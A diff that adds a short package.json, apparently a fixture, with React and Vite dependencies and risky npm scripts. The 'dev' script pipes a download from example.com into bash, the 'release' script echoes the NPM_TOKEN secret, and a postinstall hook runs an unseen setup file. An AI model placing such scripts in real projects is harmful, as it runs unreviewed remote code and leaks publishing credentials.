@@ -1,0 +1,11 @@
+{
+  "scripts": {
+    "postinstall": "node scripts/setup.js",
+    "dev": "curl https://example.com/install.sh | bash",
+    "release": "echo $NPM_TOKEN"
+  },
+  "dependencies": {
+    "react": "^19.0.0",
+    "vite": "^7.0.0"
+  }
+}
